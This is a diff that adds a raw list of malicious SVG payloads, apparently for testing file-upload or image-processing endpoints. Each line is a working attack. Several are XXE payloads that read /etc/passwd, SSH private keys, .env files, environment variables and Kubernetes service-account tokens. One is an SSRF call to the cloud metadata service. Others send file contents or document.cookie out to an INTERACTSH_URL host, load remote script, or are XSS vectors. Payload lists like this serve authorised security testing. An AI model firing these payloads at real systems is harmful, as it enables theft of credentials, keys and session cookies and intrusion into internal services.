@@ -1,0 +1,36 @@
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="file:///etc/passwd"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><use xlink:href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>parent.alert(1)</script></svg>#x"/></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://INTERACTSH_URL/">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a></svg>
+<?xml version="1.0" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe "test &amp; xxe">]><svg><text>&xxe;</text></svg>
+<svg><script>alert(1)</script></svg>
+<svg onload="alert(1)"></svg>
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1"><circle cx="100" cy="100" r="50" fill="red" onclick="alert(1)"/></svg>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % f SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY bar SYSTEM 'http://INTERACTSH_URL/?f=%f;'>">%e;]><svg xmlns="http://www.w3.org/2000/svg"><text>&bar;</text></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="alert(1)"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://INTERACTSH_URL/?c='+document.cookie)"/>
+<svg xmlns="http://www.w3.org/2000/svg"><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+#x"/></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY % xxe SYSTEM "http://INTERACTSH_URL/svg.dtd">%xxe;]><svg xmlns="http://www.w3.org/2000/svg"><text>&exfil;</text></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///app/.env">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><script href="http://INTERACTSH_URL/evil.js"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="javascript:alert(1)"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(document.domain)"><text>click</text></a></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY e1 "a"><!ENTITY e2 "&e1;&e1;&e1;&e1;&e1;">]><svg xmlns="http://www.w3.org/2000/svg"><text>&e2;</text></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><style>@import 'javascript:alert(1)'</style></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><title>XSS</title><rect onmouseover="alert(1)" width="100%" height="100%"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><text id="x">payload</text><use href="#x" onload="alert(1)"/></svg>
